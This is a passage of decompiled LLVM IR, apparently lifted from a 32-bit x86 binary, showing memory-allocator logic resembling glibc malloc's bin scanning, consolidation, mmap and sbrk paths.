  %v2_805ee77 = inttoptr i32 %v1_805ee77 to i32*
  %v3_805ee77 = load i32, i32* %v2_805ee77, align 4
  %v15_805ee77 = icmp eq i32 %v3_805ee77, %v4_805ee77
  br i1 %v15_805ee77, label %dec_label_pc_805ee81, label %dec_label_pc_805ee7c

dec_label_pc_805ee7c:                             ; preds = %dec_label_pc_805ee77, %dec_label_pc_805ee6f
  %v0_805ee7c = call i32 @abort()
  store i32 %v0_805ee7c, i32* %eax.global-to-local, align 4
  %v0_805ee81.pre = load i32, i32* @ebx, align 4
  %v0_805ee87.pre = load i32, i32* @ecx, align 4
  %v1_805ee87.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805ee81

dec_label_pc_805ee81:                             ; preds = %dec_label_pc_805ee77, %dec_label_pc_805ee7c
  %v1_805ee87 = phi i32 [ %v3_805ee6f, %dec_label_pc_805ee77 ], [ %v1_805ee87.pre, %dec_label_pc_805ee7c ]
  %v0_805ee87 = phi i32 [ %v3_805ee63, %dec_label_pc_805ee77 ], [ %v0_805ee87.pre, %dec_label_pc_805ee7c ]
  %v0_805ee81 = phi i32 [ %v1_805ee66, %dec_label_pc_805ee77 ], [ %v0_805ee81.pre, %dec_label_pc_805ee7c ]
  %v5_805ee83 = sub i32 %v0_805ee81, %v1_805f042
  store i32 %v5_805ee83, i32* %esi.global-to-local, align 4
  %v2_805ee87 = add i32 %v1_805ee87, 12
  %v3_805ee87 = inttoptr i32 %v2_805ee87 to i32*
  store i32 %v0_805ee87, i32* %v3_805ee87, align 4
  %v0_805ee8a = load i32, i32* @edx, align 4
  %v1_805ee8a = load i32, i32* @ecx, align 4
  %v2_805ee8a = add i32 %v1_805ee8a, 8
  %v3_805ee8a = inttoptr i32 %v2_805ee8a to i32*
  store i32 %v0_805ee8a, i32* %v3_805ee8a, align 4
  %v0_805ee8d = load i32, i32* %esi.global-to-local, align 4
  %v0_805ee90 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ee90 = add i32 %v0_805ee90, 8
  store i32 %v1_805ee90, i32* @ecx, align 4
  %tmp128 = icmp ult i32 %v0_805ee8d, 16
  br i1 %tmp128, label %dec_label_pc_805f391, label %dec_label_pc_805ee99

dec_label_pc_805ee99:                             ; preds = %dec_label_pc_805ee81
  %v2_805ee9d = add i32 %v0_805ee90, %v1_805f042
  store i32 %v2_805ee9d, i32* %edx.global-to-local, align 4
  %v1_805eea0 = or i32 %v1_805f042, 1
  store i32 %v1_805eea0, i32* %ebx.global-to-local, align 4
  %v2_805eea3 = add i32 %v0_805ee90, 4
  %v3_805eea3 = inttoptr i32 %v2_805eea3 to i32*
  store i32 %v1_805eea0, i32* %v3_805eea3, align 4
  %v0_805eea6 = load i32, i32* %esi.global-to-local, align 4
  %v1_805eea8 = or i32 %v0_805eea6, 1
  store i32 %v1_805eea8, i32* %eax.global-to-local, align 4
  %v0_805eeab = load i32, i32* %edx.global-to-local, align 4
  %v1_805eeab = load i32, i32* @ebp, align 4
  %v2_805eeab = add i32 %v1_805eeab, 8
  %v3_805eeab = inttoptr i32 %v2_805eeab to i32*
  store i32 %v0_805eeab, i32* %v3_805eeab, align 4
  %v0_805eeae = load i32, i32* %edx.global-to-local, align 4
  %v1_805eeae = load i32, i32* @ebp, align 4
  %v2_805eeae = add i32 %v1_805eeae, 12
  %v3_805eeae = inttoptr i32 %v2_805eeae to i32*
  store i32 %v0_805eeae, i32* %v3_805eeae, align 4
  %v0_805eeb1 = load i32, i32* %edx.global-to-local, align 4
  %v1_805eeb1 = add i32 %v0_805eeb1, 8
  %v2_805eeb1 = inttoptr i32 %v1_805eeb1 to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v2_805eeb1, align 4
  %v0_805eeb8 = load i32, i32* %edx.global-to-local, align 4
  %v1_805eeb8 = add i32 %v0_805eeb8, 12
  %v2_805eeb8 = inttoptr i32 %v1_805eeb8 to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v2_805eeb8, align 4
  %v0_805eebf = load i32, i32* %eax.global-to-local, align 4
  %v1_805eebf = load i32, i32* %edx.global-to-local, align 4
  %v2_805eebf = add i32 %v1_805eebf, 4
  %v3_805eebf = inttoptr i32 %v2_805eebf to i32*
  store i32 %v0_805eebf, i32* %v3_805eebf, align 4
  %v0_805eec2 = load i32, i32* %esi.global-to-local, align 4
  %v1_805eec2 = load i32, i32* %edx.global-to-local, align 4
  %v3_805eec2 = add i32 %v1_805eec2, %v0_805eec2
  %v4_805eec2 = inttoptr i32 %v3_805eec2 to i32*
  store i32 %v0_805eec2, i32* %v4_805eec2, align 4
  br label %dec_label_pc_805f396

dec_label_pc_805eecc:                             ; preds = %dec_label_pc_805ee60, %dec_label_pc_805ee50
  %v4_805ee77 = phi i32 [ %storemerge1.pre, %dec_label_pc_805ee50 ], [ %v3_805ee63, %dec_label_pc_805ee60 ]
  store i32 %v4_805ee77, i32* %eax.global-to-local, align 4
  %v12_805eecc = icmp eq i32 %v4_805ee77, %v2_805ee54
  %v1_805eece = icmp eq i1 %v12_805eecc, false
  br i1 %v1_805eece, label %dec_label_pc_805ee60, label %dec_label_pc_805eed0.loopexit

dec_label_pc_805eed0.loopexit:                    ; preds = %dec_label_pc_805eecc
  br label %dec_label_pc_805eed0

dec_label_pc_805eed0:                             ; preds = %dec_label_pc_805eed0.loopexit, %dec_label_pc_805ee42
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805eed9 = add i32 %stack_var_-40.0.ph, 1
  %v2_805eedc = udiv i32 %v1_805eed9, 32
  store i32 %v2_805eedc, i32* @edi, align 4
  %v1_805eedf = mul i32 %v1_805eed9, 8
  %v2_805eedf = add i32 %v1_805eedf, ptrtoint (i32* @global_var_807e14c.768 to i32)
  store i32 %v2_805eedf, i32* %ebx.global-to-local, align 4
  %v1_805eee6 = urem i32 %v1_805eed9, 32
  %v2_805eee6 = icmp eq i32 %v1_805eee6, 0
  store i32 %v1_805eee6, i32* %ecx.global-to-local, align 4
  %v1_805eee9 = mul nuw nsw i32 %v2_805eedc, 4
  %v2_805eee9 = add i32 %v1_805eee9, ptrtoint (i32* @global_var_807e454.772 to i32)
  %v3_805eee9 = inttoptr i32 %v2_805eee9 to i32*
  %v4_805eee9 = load i32, i32* %v3_805eee9, align 4
  store i32 %v4_805eee9, i32* %edx.global-to-local, align 4
  br i1 %v2_805eee6, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_805eed0
  %v5_805eef0 = shl i32 1, %v1_805eee6
  store i32 %v5_805eef0, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_805eed0, %bb85, %dec_label_pc_805ef31
  %v1_805eef2 = phi i32 [ %v1_805eef2.pre, %dec_label_pc_805ef31 ], [ %v4_805eee9, %bb85 ], [ %v4_805eee9, %dec_label_pc_805eed0 ]
  %v0_805eef6 = phi i32 [ %v0_805eef2.pre, %dec_label_pc_805ef31 ], [ %v5_805eef0, %bb85 ], [ 1, %dec_label_pc_805eed0 ]
  %tmp86 = icmp ule i32 %v0_805eef6, %v1_805eef2
  %v1_805eef6 = icmp eq i32 %v0_805eef6, 0
  %v1_805eef8 = icmp eq i1 %v1_805eef6, false
  %or.cond = and i1 %tmp86, %v1_805eef8
  br i1 %or.cond, label %dec_label_pc_805eef6.dec_label_pc_805ef26.preheader_crit_edge, label %dec_label_pc_805eefa.preheader

dec_label_pc_805eef6.dec_label_pc_805ef26.preheader_crit_edge: ; preds = %.preheader
  %v0_805ef2112.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ef26.preheader

dec_label_pc_805eefa.preheader:                   ; preds = %.preheader
  %v0_805eefa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805eefa

dec_label_pc_805eefa:                             ; preds = %dec_label_pc_805eefa.preheader, %dec_label_pc_805ef04
  %v0_805eefa = phi i32 [ %v0_805eefa.pre, %dec_label_pc_805eefa.preheader ], [ %v1_805eefa, %dec_label_pc_805ef04 ]
  %v1_805eefa = add i32 %v0_805eefa, 1
  store i32 %v1_805eefa, i32* @edi, align 4
  %v6_805eefe = icmp ugt i32 %v1_805eefa, 2
  br i1 %v6_805eefe, label %dec_label_pc_805efad.loopexit, label %dec_label_pc_805ef04

dec_label_pc_805ef04:                             ; preds = %dec_label_pc_805eefa
  %v1_805ef04 = mul i32 %v1_805eefa, 4
  %v2_805ef04 = add i32 %v1_805ef04, ptrtoint (i32* @global_var_807e454.772 to i32)
  %v3_805ef04 = inttoptr i32 %v2_805ef04 to i32*
  %v4_805ef04 = load i32, i32* %v3_805ef04, align 4
  store i32 %v4_805ef04, i32* %edx.global-to-local, align 4
  %v1_805ef0b = icmp eq i32 %v4_805ef04, 0
  br i1 %v1_805ef0b, label %dec_label_pc_805eefa, label %dec_label_pc_805ef0f

dec_label_pc_805ef0f:                             ; preds = %dec_label_pc_805ef04
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805ef16 = mul i32 %v1_805eefa, 256
  store i32 %v2_805ef16, i32* %eax.global-to-local, align 4
  %v1_805ef19 = add i32 %v2_805ef16, ptrtoint (i32* @global_var_807e14c.768 to i32)
  store i32 %v1_805ef19, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ef26.preheader

dec_label_pc_805ef26.preheader:                   ; preds = %dec_label_pc_805eef6.dec_label_pc_805ef26.preheader_crit_edge, %dec_label_pc_805ef0f
  %v0_805ef2112 = phi i32 [ %v1_805ef19, %dec_label_pc_805ef0f ], [ %v0_805ef2112.pre, %dec_label_pc_805eef6.dec_label_pc_805ef26.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805ef0f ], [ %v0_805eef6, %dec_label_pc_805eef6.dec_label_pc_805ef26.preheader_crit_edge ]
  %v0_805ef38 = phi i32 [ %v4_805ef04, %dec_label_pc_805ef0f ], [ %v1_805eef2, %dec_label_pc_805eef6.dec_label_pc_805ef26.preheader_crit_edge ]
  %v2_805ef264 = and i32 %v0_805ef38, %esi.promoted
  %v3_805ef265 = icmp eq i32 %v2_805ef264, 0
  br i1 %v3_805ef265, label %dec_label_pc_805ef21, label %dec_label_pc_805ef2a

dec_label_pc_805ef21:                             ; preds = %dec_label_pc_805ef26.preheader, %dec_label_pc_805ef21
  %v2_805ef2414 = phi i32 [ %v2_805ef24, %dec_label_pc_805ef21 ], [ %esi.promoted, %dec_label_pc_805ef26.preheader ]
  %v0_805ef2113 = phi i32 [ %v1_805ef21, %dec_label_pc_805ef21 ], [ %v0_805ef2112, %dec_label_pc_805ef26.preheader ]
  %v1_805ef21 = add i32 %v0_805ef2113, 8
  %v2_805ef24 = mul i32 %v2_805ef2414, 2
  %v2_805ef26 = and i32 %v2_805ef24, %v0_805ef38
  %v3_805ef26 = icmp eq i32 %v2_805ef26, 0
  br i1 %v3_805ef26, label %dec_label_pc_805ef21, label %dec_label_pc_805ef26.dec_label_pc_805ef2a_crit_edge

dec_label_pc_805ef26.dec_label_pc_805ef2a_crit_edge: ; preds = %dec_label_pc_805ef21
  store i32 %v1_805ef21, i32* %ebx.global-to-local, align 4
  store i32 %v2_805ef24, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805ef2a

dec_label_pc_805ef2a:                             ; preds = %dec_label_pc_805ef26.dec_label_pc_805ef2a_crit_edge, %dec_label_pc_805ef26.preheader
  %v0_805ef3a = phi i32 [ %v2_805ef24, %dec_label_pc_805ef26.dec_label_pc_805ef2a_crit_edge ], [ %esi.promoted, %dec_label_pc_805ef26.preheader ]
  %v1_805ef54 = phi i32 [ %v1_805ef21, %dec_label_pc_805ef26.dec_label_pc_805ef2a_crit_edge ], [ %v0_805ef2112, %dec_label_pc_805ef26.preheader ]
  %v1_805ef2a = add i32 %v1_805ef54, 12
  %v2_805ef2a = inttoptr i32 %v1_805ef2a to i32*
  %v3_805ef2a = load i32, i32* %v2_805ef2a, align 4
  store i32 %v3_805ef2a, i32* @ecx, align 4
  %v12_805ef2d = icmp eq i32 %v3_805ef2a, %v1_805ef54
  %v1_805ef2f = icmp eq i1 %v12_805ef2d, false
  br i1 %v1_805ef2f, label %dec_label_pc_805ef45, label %dec_label_pc_805ef31

dec_label_pc_805ef31:                             ; preds = %dec_label_pc_805ef2a
  %v1_805ef33 = add i32 %v3_805ef2a, 8
  store i32 %v1_805ef33, i32* %ebx.global-to-local, align 4
  %v1_805ef36 = sub i32 -1, %v0_805ef3a
  store i32 %v1_805ef36, i32* %eax.global-to-local, align 4
  %v2_805ef38 = and i32 %v0_805ef38, %v1_805ef36
  store i32 %v2_805ef38, i32* %edx.global-to-local, align 4
  %v2_805ef3a = mul i32 %v0_805ef3a, 2
  store i32 %v2_805ef3a, i32* %esi.global-to-local, align 4
  %v1_805ef3c = load i32, i32* @edi, align 4
  %v2_805ef3c = mul i32 %v1_805ef3c, 4
  %v3_805ef3c = add i32 %v2_805ef3c, ptrtoint (i32* @global_var_807e454.772 to i32)
  %v4_805ef3c = inttoptr i32 %v3_805ef3c to i32*
  store i32 %v2_805ef38, i32* %v4_805ef3c, align 4
  %v0_805eef2.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805eef2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805ef45:                             ; preds = %dec_label_pc_805ef2a
  %v1_805ef45 = add i32 %v3_805ef2a, 4
  %v2_805ef45 = inttoptr i32 %v1_805ef45 to i32*
  %v3_805ef45 = load i32, i32* %v2_805ef45, align 4
  store i32 %v3_805ef45, i32* %edx.global-to-local, align 4
  %v1_805ef48 = add i32 %v3_805ef2a, 12
  %v2_805ef48 = inttoptr i32 %v1_805ef48 to i32*
  %v3_805ef48 = load i32, i32* %v2_805ef48, align 4
  store i32 %v3_805ef48, i32* %eax.global-to-local, align 4
  %v1_805ef4b = and i32 %v3_805ef45, -4
  store i32 %v1_805ef4b, i32* %edx.global-to-local, align 4
  %v5_805ef50 = sub i32 %v1_805ef4b, %v1_805f042
  store i32 %v5_805ef50, i32* %esi.global-to-local, align 4
  store i32 %v3_805ef48, i32* %v2_805ef2a, align 4
  %v0_805ef57 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ef57 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ef57 = add i32 %v1_805ef57, 8
  %v3_805ef57 = inttoptr i32 %v2_805ef57 to i32*
  store i32 %v0_805ef57, i32* %v3_805ef57, align 4
  %v0_805ef5a = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_805ef5a, 16
  br i1 %tmp129, label %dec_label_pc_805ef5f, label %dec_label_pc_805ef66

dec_label_pc_805ef5f:                             ; preds = %dec_label_pc_805ef45
  %v0_805ef5f = load i32, i32* @ecx, align 4
  %v1_805ef5f = load i32, i32* %edx.global-to-local, align 4
  %v2_805ef5f = add i32 %v0_805ef5f, 4
  %v3_805ef5f = add i32 %v2_805ef5f, %v1_805ef5f
  %v4_805ef5f = inttoptr i32 %v3_805ef5f to i32*
  %v5_805ef5f = load i32, i32* %v4_805ef5f, align 4
  %v6_805ef5f = or i32 %v5_805ef5f, 1
  store i32 %v6_805ef5f, i32* %v4_805ef5f, align 4
  br label %dec_label_pc_805efa5

dec_label_pc_805ef66:                             ; preds = %dec_label_pc_805ef45
  store i32 %v1_805f042, i32* %eax.global-to-local, align 4
  %v0_805ef6f = load i32, i32* @ecx, align 4
  %v2_805ef6f = add i32 %v0_805ef6f, %v1_805f042
  store i32 %v2_805ef6f, i32* %edx.global-to-local, align 4
  %v1_805ef72 = load i32, i32* @ebp, align 4
  %v2_805ef72 = add i32 %v1_805ef72, 8
  %v3_805ef72 = inttoptr i32 %v2_805ef72 to i32*
  store i32 %v2_805ef6f, i32* %v3_805ef72, align 4
  %v0_805ef75 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ef75 = load i32, i32* @ebp, align 4
  %v2_805ef75 = add i32 %v1_805ef75, 12
  %v3_805ef75 = inttoptr i32 %v2_805ef75 to i32*
  store i32 %v0_805ef75, i32* %v3_805ef75, align 4
  %v0_805ef78 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ef78 = add i32 %v0_805ef78, 8
  %v2_805ef78 = inttoptr i32 %v1_805ef78 to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v2_805ef78, align 4
  %v0_805ef7f = load i32, i32* %edx.global-to-local, align 4
  %v1_805ef7f = add i32 %v0_805ef7f, 12
  %v2_805ef7f = inttoptr i32 %v1_805ef7f to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v2_805ef7f, align 4
  br i1 %v6_805ecfb, label %dec_label_pc_805ef8e, label %dec_label_pc_805ef88

dec_label_pc_805ef88:                             ; preds = %dec_label_pc_805ef66
  %v0_805ef88 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805ef88, i32* @global_var_807e150.769, align 16
  br label %dec_label_pc_805ef8e

dec_label_pc_805ef8e:                             ; preds = %dec_label_pc_805ef66, %dec_label_pc_805ef88
  %v4_805ef8e = or i32 %v1_805f042, 1
  %v0_805ef93 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805ef8e, i32* %ebx.global-to-local, align 4
  %v1_805ef99 = or i32 %v0_805ef93, 1
  store i32 %v1_805ef99, i32* %eax.global-to-local, align 4
  %v1_805ef9c = load i32, i32* @ecx, align 4
  %v2_805ef9c = add i32 %v1_805ef9c, 4
  %v3_805ef9c = inttoptr i32 %v2_805ef9c to i32*
  store i32 %v4_805ef8e, i32* %v3_805ef9c, align 4
  %v0_805ef9f = load i32, i32* %esi.global-to-local, align 4
  %v1_805ef9f = load i32, i32* %edx.global-to-local, align 4
  %v3_805ef9f = add i32 %v1_805ef9f, %v0_805ef9f
  %v4_805ef9f = inttoptr i32 %v3_805ef9f to i32*
  store i32 %v0_805ef9f, i32* %v4_805ef9f, align 4
  %v0_805efa2 = load i32, i32* %eax.global-to-local, align 4
  %v1_805efa2 = load i32, i32* %edx.global-to-local, align 4
  %v2_805efa2 = add i32 %v1_805efa2, 4
  %v3_805efa2 = inttoptr i32 %v2_805efa2 to i32*
  store i32 %v0_805efa2, i32* %v3_805efa2, align 4
  br label %dec_label_pc_805efa5

dec_label_pc_805efa5:                             ; preds = %dec_label_pc_805ef5f, %dec_label_pc_805ef8e
  %v0_805efa5 = load i32, i32* @ecx, align 4
  %v1_805efa5 = add i32 %v0_805efa5, 8
  store i32 %v1_805efa5, i32* @ebx, align 4
  br label %dec_label_pc_805f3a7

dec_label_pc_805efad.loopexit:                    ; preds = %dec_label_pc_805eefa
  br label %dec_label_pc_805efad

dec_label_pc_805efad:                             ; preds = %dec_label_pc_805efad.loopexit, %dec_label_pc_805ecb5, %dec_label_pc_805ecbd
  %v0_805efad = load i32, i32* @global_var_807e14c.768, align 4
  store i32 %v0_805efad, i32* @ebx, align 4
  %v1_805efb7 = add i32 %v1_805f042, 16
  store i32 %v1_805efb7, i32* @esi, align 4
  %v1_805efba = add i32 %v0_805efad, 4
  %v2_805efba = inttoptr i32 %v1_805efba to i32*
  %v3_805efba = load i32, i32* %v2_805efba, align 4
  %v1_805efc1 = and i32 %v3_805efba, -4
  store i32 %v1_805efc1, i32* %ecx.global-to-local, align 4
  %v7_805efc4 = icmp ult i32 %v1_805efc1, %v1_805efb7
  br i1 %v7_805efc4, label %dec_label_pc_805efe4, label %dec_label_pc_805efc8

dec_label_pc_805efc8:                             ; preds = %dec_label_pc_805efad
  %v2_805efcc = add i32 %v0_805efad, %v1_805f042
  store i32 %v2_805efcc, i32* %edx.global-to-local, align 4
  %v1_805efcf = or i32 %v1_805f042, 1
  store i32 %v1_805efcf, i32* %eax.global-to-local, align 4
  store i32 %v2_805efcc, i32* @global_var_807e14c.768, align 4
  store i32 %v1_805efcf, i32* %v2_805efba, align 4
  %v0_805efdb = load i32, i32* %ecx.global-to-local, align 4
  %v5_805efdb = sub i32 %v0_805efdb, %v1_805f042
  store i32 %v5_805efdb, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805f337

dec_label_pc_805efe4:                             ; preds = %dec_label_pc_805efad
  %v0_805efe4 = load i32, i32* @global_var_807e47c.773, align 4
  store i32 %v0_805efe4, i32* %edx.global-to-local, align 4
  %v0_805efea = load i8, i8* @global_var_807e120.767, align 32
  %v1_805efea = and i8 %v0_805efea, 2
  %v2_805efea = icmp eq i8 %v1_805efea, 0
  br i1 %v2_805efea, label %dec_label_pc_805f018, label %dec_label_pc_805eff3

dec_label_pc_805eff3:                             ; preds = %dec_label_pc_805efe4
  store i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32* %stack_var_-92, align 4
  %v2_805effb = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e120.767 to i32*))
  store i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32* @ebx, align 4
  %v1_805f005 = add i32 %v1_805f042, -7
  store i32 %v1_805f005, i32* %eax.global-to-local, align 4
  store i32 %v1_805f005, i32* %stack_var_-92, align 4
  %v1_805f009 = call i32 @malloc(i32 %v1_805f005)
  store i32 %v1_805f009, i32* %eax.global-to-local, align 4
  store i32 %v1_805f009, i32* @ebx, align 4
  br label %dec_label_pc_805f3a7

dec_label_pc_805f018:                             ; preds = %dec_label_pc_805efe4
  %v1_805f018 = add i32 %v0_805efe4, -1
  store i32 %v1_805f018, i32* @ecx, align 4
  store i32 %v1_805f042, i32* @ebx, align 4
  %v1_805f023 = load i32, i32* @global_var_807e46c.774, align 4
  %v7_805f023 = icmp ult i32 %v1_805f042, %v1_805f023
  br i1 %v7_805f023, label %dec_label_pc_805f0e5, label %dec_label_pc_805f02f

dec_label_pc_805f02f:                             ; preds = %dec_label_pc_805f018
  %v0_805f02f = load i32, i32* @global_var_807e470.775, align 16
  store i32 %v0_805f02f, i32* %eax.global-to-local, align 4
  %v1_805f034 = load i32, i32* @global_var_807e474.776, align 4
  %v5_805f03a = icmp slt i32 %v0_805f02f, %v1_805f034
  br i1 %v5_805f03a, label %dec_label_pc_805f040, label %dec_label_pc_805f0e5

dec_label_pc_805f040:                             ; preds = %dec_label_pc_805f02f
  %v2_805f042 = add i32 %v1_805f042, 10
  %v3_805f042 = add i32 %v2_805f042, %v0_805efe4
  %v1_805f046 = sub i32 0, %v0_805efe4
  store i32 %v1_805f046, i32* %eax.global-to-local, align 4
  %v2_805f048 = and i32 %v3_805f042, %v1_805f046
  store i32 %v2_805f048, i32* @ebx, align 4
  %tmp134 = icmp ugt i32 %v2_805f048, %v1_805f042
  br i1 %tmp134, label %dec_label_pc_805f054, label %dec_label_pc_805f0e5

dec_label_pc_805f054:                             ; preds = %dec_label_pc_805f040
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805f061 = call i32 @mmap(i32 0, i32 %v2_805f048, i32 3, i32 34, i32 0, i32 0, i32 %v1_805f018, i32 %v1_805f018)
  store i32 %v8_805f061, i32* %eax.global-to-local, align 4
  store i32 %v8_805f061, i32* %edx.global-to-local, align 4
  %v10_805f06b = icmp eq i32 %v8_805f061, -1
  br i1 %v10_805f06b, label %dec_label_pc_805f054.dec_label_pc_805f0e5_crit_edge, label %dec_label_pc_805f070

dec_label_pc_805f054.dec_label_pc_805f0e5_crit_edge: ; preds = %dec_label_pc_805f054
  %v0_805f0e5.pre = load i32, i32* @global_var_807e14c.768, align 4
  br label %dec_label_pc_805f0e5

dec_label_pc_805f070:                             ; preds = %dec_label_pc_805f054
  %v1_805f072 = urem i32 %v8_805f061, 8
  %v2_805f072 = icmp eq i32 %v1_805f072, 0
  store i32 %v1_805f072, i32* @ecx, align 4
  br i1 %v2_805f072, label %dec_label_pc_805f08a, label %dec_label_pc_805f077

dec_label_pc_805f077:                             ; preds = %dec_label_pc_805f070
  %v0_805f07c = load i32, i32* @ebx, align 4
  %v2_805f07e = sub nsw i32 8, %v1_805f072
  store i32 %v2_805f07e, i32* %eax.global-to-local, align 4
  %v2_805f080 = add i32 %v2_805f07e, %v8_805f061
  store i32 %v2_805f080, i32* %edx.global-to-local, align 4
  %v2_805f082 = sub i32 %v0_805f07c, %v2_805f07e
  store i32 %v2_805f082, i32* %esi.global-to-local, align 4
  %v2_805f084 = inttoptr i32 %v2_805f080 to i32*
  store i32 %v2_805f07e, i32* %v2_805f084, align 4
  br label %dec_label_pc_805f092

dec_label_pc_805f08a:                             ; preds = %dec_label_pc_805f070
  %v1_805f08a = inttoptr i32 %v8_805f061 to i32*
  store i32 0, i32* %v1_805f08a, align 4
  br label %dec_label_pc_805f092

dec_label_pc_805f092:                             ; preds = %dec_label_pc_805f077, %dec_label_pc_805f08a
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805f077 ], [ @ebx, %dec_label_pc_805f08a ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805f092 = or i32 %storemerge, 2
  %v1_805f095 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f095 = add i32 %v1_805f095, 4
  %v3_805f095 = inttoptr i32 %v2_805f095 to i32*
  store i32 %v1_805f092, i32* %v3_805f095, align 4
  %v0_805f098 = load i32, i32* @global_var_807e470.775, align 16
  %v1_805f09d = add i32 %v0_805f098, 1
  store i32 %v1_805f09d, i32* %eax.global-to-local, align 4
  store i32 %v1_805f09d, i32* @global_var_807e470.775, align 16
  %v1_805f0a3 = load i32, i32* @global_var_807e478.777, align 8
  %v7_805f0a9 = icmp sgt i32 %v1_805f09d, %v1_805f0a3
  br i1 %v7_805f0a9, label %dec_label_pc_805f0ab, label %dec_label_pc_805f0b0

dec_label_pc_805f0ab:                             ; preds = %dec_label_pc_805f092
  store i32 %v1_805f09d, i32* @global_var_807e478.777, align 8
  br label %dec_label_pc_805f0b0

dec_label_pc_805f0b0:                             ; preds = %dec_label_pc_805f092, %dec_label_pc_805f0ab
  %v0_805f0b0 = load i32, i32* @global_var_807e484.778, align 4
  %v1_805f0b5 = load i32, i32* @ebx, align 4
  %v2_805f0b5 = add i32 %v1_805f0b5, %v0_805f0b0
  store i32 %v2_805f0b5, i32* %eax.global-to-local, align 4
  store i32 %v2_805f0b5, i32* @global_var_807e484.778, align 4
  %v1_805f0bc = load i32, i32* @global_var_807e490.779, align 16
  %tmp135 = icmp ugt i32 %v2_805f0b5, %v1_805f0bc
  br i1 %tmp135, label %dec_label_pc_805f0c4, label %dec_label_pc_805f0c9

dec_label_pc_805f0c4:                             ; preds = %dec_label_pc_805f0b0
  store i32 %v2_805f0b5, i32* @global_var_807e490.779, align 16
  br label %dec_label_pc_805f0c9

dec_label_pc_805f0c9:                             ; preds = %dec_label_pc_805f0b0, %dec_label_pc_805f0c4
  %v1_805f0c9 = load i32, i32* @global_var_807e488.780, align 8
  %v2_805f0c9 = add i32 %v1_805f0c9, %v2_805f0b5
  store i32 %v2_805f0c9, i32* %eax.global-to-local, align 4
  %v1_805f0cf = load i32, i32* @global_var_807e494.781, align 4
  %tmp136 = icmp ugt i32 %v2_805f0c9, %v1_805f0cf
  br i1 %tmp136, label %dec_label_pc_805f0db, label %dec_label_pc_805ed2c

dec_label_pc_805f0db:                             ; preds = %dec_label_pc_805f0c9
  store i32 %v2_805f0c9, i32* @global_var_807e494.781, align 4
  br label %dec_label_pc_805ed2c

dec_label_pc_805f0e5:                             ; preds = %dec_label_pc_805f040, %dec_label_pc_805f054.dec_label_pc_805f0e5_crit_edge, %dec_label_pc_805f02f, %dec_label_pc_805f018
  %v0_805f0e5 = phi i32 [ %v0_805f0e5.pre, %dec_label_pc_805f054.dec_label_pc_805f0e5_crit_edge ], [ %v0_805efad, %dec_label_pc_805f02f ], [ %v0_805efad, %dec_label_pc_805f040 ], [ %v0_805efad, %dec_label_pc_805f018 ]
  store i32 %v0_805f0e5, i32* %eax.global-to-local, align 4
  %v1_805f0ee = add i32 %v0_805f0e5, 4
  %v2_805f0ee = inttoptr i32 %v1_805f0ee to i32*
  %v3_805f0ee = load i32, i32* %v2_805f0ee, align 4
  %v1_805f0f8 = and i32 %v3_805f0ee, -4
  %v2_805f0f8 = icmp eq i32 %v1_805f0f8, 0
  store i32 %v1_805f0f8, i32* @ebp, align 4
  %v1_805f0fb = load i32, i32* @global_var_807e468.782, align 8
  %v2_805f0fb = add i32 %v1_805f0fb, %v1_805efb7
  store i32 %v2_805f0fb, i32* %eax.global-to-local, align 4
  %v0_805f101 = load i8, i8* @global_var_807e480.783, align 128
  %v1_805f101 = urem i8 %v0_805f101, 2
  %v2_805f101 = icmp eq i8 %v1_805f101, 0
  br i1 %v2_805f101, label %dec_label_pc_805f10c, label %dec_label_pc_805f10a

dec_label_pc_805f10a:                             ; preds = %dec_label_pc_805f0e5
  %v2_805f10a = sub i32 %v2_805f0fb, %v1_805f0f8
  store i32 %v2_805f10a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f10c

dec_label_pc_805f10c:                             ; preds = %dec_label_pc_805f0e5, %dec_label_pc_805f10a
  %v0_805f110 = phi i32 [ %v2_805f0fb, %dec_label_pc_805f0e5 ], [ %v2_805f10a, %dec_label_pc_805f10a ]
  %v5_805f110 = add i32 %v0_805f110, %v1_805f018
  store i32 %v5_805f110, i32* %eax.global-to-local, align 4
  %v1_805f114 = sub i32 0, %v0_805efe4
  store i32 %v1_805f114, i32* %edx.global-to-local, align 4
  %v2_805f11c = and i32 %v5_805f110, %v1_805f114
  store i32 %v2_805f11c, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_805f11c, 1
  br i1 %tmp88, label %dec_label_pc_805f136, label %dec_label_pc_805f120

dec_label_pc_805f120:                             ; preds = %dec_label_pc_805f10c
  store i32 %v2_805f11c, i32* %stack_var_-92, align 4
  %v1_805f124 = call i32 @__GI_sbrk(i32 %v2_805f11c)
